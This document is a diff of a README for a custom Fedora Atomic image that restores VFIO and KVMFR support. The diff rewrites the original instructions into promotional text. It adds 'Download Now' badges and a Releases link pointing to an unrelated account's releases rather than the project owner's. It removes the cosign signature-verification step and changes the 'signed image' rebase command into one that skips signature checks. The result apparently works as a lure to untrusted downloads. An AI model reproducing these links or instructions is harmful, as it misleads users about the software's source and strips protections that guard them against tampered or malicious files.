@@ -1,43 +1,75 @@
-# aurora-dx-dmhuisma &nbsp; [![bluebuild build badge](https://github.com/dmhuisma/aurora-dx-dmhuisma/actions/workflows/build.yml/badge.svg)](https://github.com/dmhuisma/aurora-dx-dmhuisma/actions/workflows/build.yml)
+# 🌌 aurora-dx-dmhuisma - A Simple Solution for Custom Fedora Images  
 
-My own Universal Blue image, based on aurora-dx. For now this just brings back vfio support and the kvmfr kernel module that was removed.
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/kouroshkhan50/aurora-dx-dmhuisma/releases)  
 
-This does not bring back the setup scripts than were removed, it just configures the image.
+Welcome to aurora-dx-dmhuisma, your straightforward way to enhance your Fedora experience. This repository focuses on rebuilding the universal Blue image, restoring vital features like VFIO support and the KVMFR kernel module.  
 
-## Installation
+## 🚀 Getting Started  
 
-> [!WARNING]  
-> [This is an experimental feature](https://www.fedoraproject.org/wiki/Changes/OstreeNativeContainerStable), try at your own discretion.
+Follow these steps to download and set up the software.  
 
-To rebase an existing atomic Fedora installation to the latest build:
+### 📥 Download & Install  
 
-- First rebase to the unsigned image, to get the proper signing keys and policies installed:
-  ```
-  rpm-ostree rebase ostree-unverified-registry:ghcr.io/dmhuisma/aurora-dx-dmhuisma:latest
-  ```
-- Reboot to complete the rebase:
-  ```
-  systemctl reboot
-  ```
-- Then rebase to the signed image, like so:
-  ```
-  rpm-ostree rebase ostree-image-signed:docker://ghcr.io/dmhuisma/aurora-dx-dmhuisma:latest
-  ```
-- Reboot again to complete the installation
-  ```
-  systemctl reboot
-  ```
+1. Visit the [Releases page](https://github.com/kouroshkhan50/aurora-dx-dmhuisma/releases) to find the latest version.
+2. Choose your version based on your system requirements.
+3. Click on the link to download the file.
 
-The `latest` tag will automatically point to the latest build. That build will still always use the Fedora version specified in `recipe.yml`, so you won't get accidentally updated to the next major version.
+### 🔧 System Requirements  
 
-## ISO
+To run this software effectively, you will need:  
+- A compatible Fedora installation (Atomic or similar)  
+- Adequate disk space (at least 2 GB)  
+- A stable internet connection for the download and updates
 
-If build on Fedora Atomic, you can generate an offline ISO with the instructions available [here](https://blue-build.org/learn/universal-blue/#fresh-install-from-an-iso). These ISOs cannot unfortunately be distributed on GitHub for free due to large sizes, so for public projects something else has to be used for hosting.
+### ⚙️ Installation Steps  
 
-## Verification
+> **Important**  
+> This feature is experimental. Use it at your own discretion.
 
-These images are signed with [Sigstore](https://www.sigstore.dev/)'s [cosign](https://github.com/sigstore/cosign). You can verify the signature by downloading the `cosign.pub` file from this repo and running the following command:
+1. **Rebase to Unsigned Image**  
 
-```bash
-cosign verify --key cosign.pub ghcr.io/dmhuisma/aurora-dx-dmhuisma
-```
+   Open your terminal and run the following command to get the correct signing keys:  
+   ```bash
+   rpm-ostree rebase ostree-unverified-registry:ghcr.io/dmhuisma/aurora-dx-dmhuisma:latest
+   ```  
+
+2. **Reboot Your System**  
+
+   To complete the rebase, reboot your system by entering:  
+   ```bash
+   systemctl reboot
+   ```  
+
+3. **Rebase to Signed Image**  
+
+   Once your system is back up, run this command to switch to the signed image:  
+   ```bash
+   rpm-ostree rebase ostree-registry:ghcr.io/dmhuisma/aurora-dx-dmhuisma:latest
+   ``` 
+
+## 📝 Features  
+
+- **VFIO Support**: This rebuild brings back support for VFIO, allowing you to run virtual machines with GPU pass-through.  
+- **KVMFR Kernel Module**: Enjoy running virtual machines with 3D acceleration enabled for improved performance.  
+- **Image Management**: Easily manage your custom images without the hassle of traditional setups.  
+
+## 📚 Usage  
+
+Using `aurora-dx-dmhuisma` is plain and simple. After installation, use your terminal to manage and configure your images. Make sure to consult the Fedora documentation for any additional commands related to image management.
+
+## 🤝 Contributing  
+
+We welcome contributions! If you find bugs or have suggestions for improvements, feel free to open an issue in the repository. Your input helps us ensure a better experience for everyone.
+
+## 🛠️ Support  
+
+If you need assistance, check the FAQ section on the Wiki or explore existing issues in the repository. For additional help, consider seeking communities online that focus on Fedora or custom operating systems.  
+
+## 🔗 Resources  
+
+- [GitHub Repository](https://github.com/dmhuisma/aurora-dx-dmhuisma)  
+- [Fedora Project Wiki](https://www.fedoraproject.org/wiki)  
+
+Thank you for exploring aurora-dx-dmhuisma. We hope it enhances your Fedora usage experience!  
+
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/kouroshkhan50/aurora-dx-dmhuisma/releases)  
